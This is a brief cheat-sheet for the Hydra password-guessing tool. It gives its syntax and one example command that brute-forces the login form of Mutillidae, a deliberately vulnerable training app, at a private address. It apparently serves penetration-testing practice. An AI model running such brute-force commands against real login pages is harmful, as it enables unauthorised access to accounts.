# Hydra

## Syntax
```hydra [ip]  -l [usernames] -P [passwords] [service]```

## Example 
```cmd
hydra 10.20.14.212 -l admin -P /root/test.txt http-post-form "/mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:F=Not Logged In"
```
